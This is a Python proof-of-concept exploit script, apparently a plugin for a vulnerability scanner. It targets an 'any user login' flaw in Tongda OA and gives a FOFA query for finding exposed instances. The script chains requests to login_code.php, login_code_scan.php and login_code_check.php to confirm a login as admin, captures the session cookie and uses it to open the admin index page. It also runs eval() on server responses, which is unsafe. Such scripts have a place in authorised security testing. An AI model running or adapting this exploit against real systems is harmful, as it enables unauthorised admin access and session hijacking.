#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import requests.packages.urllib3
import re
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='TDXK_Any user login'
AUTHOR="境心"
REMARK='TDXK_任意用户登录'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc(target):
    result = {}
    # 第一步
    login_code_url = target+"/ispirit/login_code.php"
    login_code_headers = {
        "User-Agent" : ua
    }
    login_code_res = requests.get(login_code_url,headers=login_code_headers, verify=False,timeout=5)
    login_code_res = eval(login_code_res.text)
    try:
        codeuid = login_code_res['codeuid']
    except:
        pass
    else:
        # 第二步
        login_code_scan_url = target+"/general/login_code_scan.php"
        login_code_scan_headers = {
            "User-Agent" : ua
        }
        login_code_scan_data = {
            "uid" : "1",
            "codeuid" : codeuid,
            "type" : "confirm",
            "source" : "pc",
            "username" : "admin"
        }
        # 第三步
        login_code_scan_res = requests.post(login_code_scan_url,data=login_code_scan_data,headers=login_code_scan_headers, verify=False,timeout=5)
        if "1" in login_code_scan_res.text:
            login_code_check_url = target+"/ispirit/login_code_check.php?codeuid="+codeuid
            login_code_check_headers = {
                "User-Agent" : ua
            }
            login_code_check_res = requests.get(login_code_check_url,headers=login_code_check_headers, verify=False,timeout=5)
            if "confirm" in login_code_check_res.text:
                login_cookie = login_code_check_res.headers['Set-Cookie']
                # 第四步
                target_url = target+"/general/index.php"
                headers = {
                    "User-Agent": ua,
                    "Cookie" : login_cookie
                }
                target_res = requests.get(target_url,headers=headers,verify=False,timeout=5)
                try:
                    title = re.findall('<title>(.*)</title>', str(target_res.text))[0]
                except:
                    title = ""
                result['vul_url'] = target_url
                result['cookie'] = login_cookie
                result['title'] = title
                result['message'] = "存在任意用户登录漏洞"
                return result

if __name__ == '__main__':
    poc("http://127.0.0.1")